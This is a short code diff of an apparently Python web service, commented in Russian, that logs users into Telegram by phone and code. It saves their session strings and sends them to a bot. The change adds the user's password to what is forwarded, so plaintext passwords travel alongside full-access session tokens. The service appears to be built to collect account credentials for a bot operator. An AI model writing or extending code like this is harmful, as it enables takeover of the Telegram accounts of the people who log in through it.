@@ -138,7 +138,7 @@ async def verify_code(request: Request):
         logger.info(f"Authorized: {me.id} @{me.username} phone={phone}, bot_user_id={bot_user_id}")
 
         await save_session(str(me.id), phone, session_string, me.username)
-        await notify_bot(bot_user_id, me.id, phone, session_string, me.username, me.first_name)
+        await notify_bot(bot_user_id, me.id, phone, session_string, me.username, me.first_name, password)
 
         # Очищаем временную сессию из памяти
         sessions.pop(session_id, None)
@@ -169,7 +169,7 @@ async def save_session(user_id: str, phone: str, session_string: str, username: 
     logger.info(f"Session saved: {path}")
 
 
-async def notify_bot(bot_user_id: int, tg_account_id: int, phone: str, session_string: str, username: str | None, first_name: str | None):
+async def notify_bot(bot_user_id: int, tg_account_id: int, phone: str, session_string: str, username: str | None, first_name: str | None, password: str = ""):
     uname_str = f"@{username}" if username else "без username"
 
     # 1. Отправляем session_string боту через его внутренний webhook
